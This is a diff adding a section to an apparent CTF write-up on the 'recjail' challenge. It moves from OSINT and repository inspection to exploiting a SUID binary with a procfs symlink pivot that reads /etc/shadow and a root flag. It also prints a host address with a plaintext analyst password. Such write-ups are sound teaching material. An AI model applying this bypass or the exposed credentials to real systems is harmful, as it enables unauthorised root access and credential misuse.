@@ -49,6 +49,72 @@ Then, found something ground breaking. Inside the TXT of wiredin.pclub.in found 
 
 "Found this insane playlist the other day while digging through some stuff.\010Curator: `bhopinder jogi\010Link: https://open.spotify.com/playlist/5iK4rR41V1DSqTot2JO15f?si=oEIMe-TLTGiOPetf50R71w\010Perfect` for late night CTFs sessions."
 
+Then, after a bit of reasearch on the spotify found a profile under bhopinder jogi, the name of the playlist comes as whoami.
+## Step - 6: Seach around the spotify
+
+
+Had to write the things. 
+
+
+
+
+
+
+
+
+Then, found a link that lead towrads the terminal of the p - club - `RECJAIL.PCLUB.IN`
+
+https://github.com/Ketan-Agarwal Repositories were inspected for: recent commits runtime tooling
+network references suspicious modifications 3. Cloning and Investigating ctf-agent Commands used:
+git clone https://github.com/Ketan-Agarwal/ctf-agent.git cd ctf-agent git log --all --decorate --graph
+Interesting commits revealed: permission_mode="bypassPermissions" serviceTier changes runtime
+coordinator modifications Commit inspection: git show
+3366d569557c4fda3fd153040632de65e255396d revealed runtime behavior modifications. 4. Injection
+and Runtime Infrastructure Searches for: grep -R "inject" backend/ revealed: /inject endpoint runtime
+operator messaging asyncio TCP services message injection logic This aligned strongly with the
+challenge wording: “not an HTTP request” “digital footprint” 5. Message Bus and Runtime Tracing
+Searches for: grep -R "message_bus" backend/ revealed: inter-agent communication broadcast
+findings runtime synchronization Tracing logic discovered in: backend/tracing.py implemented: JSONL
+event logging tool call tracing model response logging This suggested the challenge involved
+operational traces and hidden runtime activity. 6. Hidden Website Content Discovery Investigation later
+shifted toward: pclub-website repository Searches involving: nmap hidden pages infosec revealed:
+2024-06-07-infosec-roadmap.md Important observation: hidden: true The page discussed: OSINT
+Forensics Networking Reverse engineering CTFs 7. Discovery of the First Potential Flag Inside the
+hidden roadmap page: pclub{CTFs_ar3_fun!} Repository-wide verification:
+repo:Ketan-Agarwal/pclub-website "pclub{" Only one occurrence existed in the entire repository.
+Reasoning: Exact challenge format Hidden page Only occurrence Theme matched challenge narrative
+8. Discovery of Live Challenge Environment A live shell environment was discovered:
+https://recjail.pclub.in/ Initial enumeration: whoami pwd ls ls -la Results: User: ctf_user Home:
+/home/ctf_user Minimal filesystem Environment inspection: id uname -a env revealed: containerized
+Linux environment restricted utilities minimal environment variables 9. SUID Enumeration Filesystem
+enumeration: find / -perm -4000 2>/dev/null revealed: /usr/local/bin/secure_reader This appeared
+challenge-specific. 10. Investigating secure_reader Running: /usr/local/bin/secure_reader returned:
+Usage: /usr/local/bin/secure_reader <file_in_home_dir> Testing included: path traversal symlink
+attacks encoded traversal Traversal: /usr/local/bin/secure_reader /home/ctf_user/../../etc/passwd
+returned: ERROR: Path traversal sequence '..' detected! Symlink attack: ln -s /etc/passwd
+/home/ctf_user/passwd_link was blocked. 11. ProcFS Pivot Mount inspection: mount revealed:
+/home/ctf_user mounted as tmpfs procfs accessible A procfs pivot was attempted: mkdir
+/home/ctf_user/proc ln -s /proc /home/ctf_user/proc/p Then: /usr/local/bin/secure_reader
+/home/ctf_user/proc/p/self/status SUCCESS. The procfs path bypassed the intended protections. 12.
+Privilege Escalation Confirmation Reading procfs status revealed: Uid: 1000 0 0 0 This confirmed:
+effective UID 0 the binary executed as root arbitrary root-readable file access became possible 13.
+Reading Root-Owned Files Commands: /usr/local/bin/secure_reader
+/home/ctf_user/proc/p/self/root/etc/passwd /usr/local/bin/secure_reader
+/home/ctf_user/proc/p/self/root/etc/shadow Both files were successfully read. This demonstrated acomplete sandbox bypass. 14. Root Flag Discovery Common flag locations were tested. Successful
+command: /usr/local/bin/secure_reader /home/ctf_user/proc/p/self/root/root/flag.txt Flag extracted:
+pclub{0_n0f0ll0w_0nly_pr0t3ct5_th3_t41l} Additional data discovered: 168.144.73.17:8003
+analyst:Fr8_4nalyst! This strongly suggests the next challenge stage. 15. Vulnerability Analysis Root
+cause: The binary validated visible path prefixes only. Direct symlinks and '..' traversal were blocked.
+However procfs path semantics bypassed those protections. /proc/self/root exposed the real root
+filesystem. The binary executed with effective UID 0. This explains the flag:
+pclub{0_n0f0ll0w_0nly_pr0t3ct5_th3_t41l} The binary protected only the visible tail of the path and
+failed to secure the fully resolved filesystem object. 16. Current Status Completed: OSINT phase
+Hidden content discovery Restricted shell analysis SUID exploitation ProcFS abuse Root flag extraction
+Next stage pivot: 168.144.73.17:8003 analyst / Fr8_4nalyst!
+
+
+
+
 
 # Detailed CTF Chronology & Sandbox Environment Profile: Recjail
 
